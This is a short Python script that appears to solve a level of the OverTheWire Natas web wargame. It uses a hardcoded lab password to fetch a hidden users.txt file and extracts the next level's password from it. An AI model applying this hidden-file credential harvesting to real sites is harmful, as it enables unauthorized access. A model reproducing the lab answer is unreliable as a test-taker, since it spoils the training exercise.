import re
import requests

username = 'natas3'
password = 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14'
url = 'http://%s.natas.labs.overthewire.org/s3cr3t/users.txt' % username

response = requests.get(url, auth=(username, password))

content = response.text

flag = re.findall('natas4:(.*)', content)[0]

print(flag)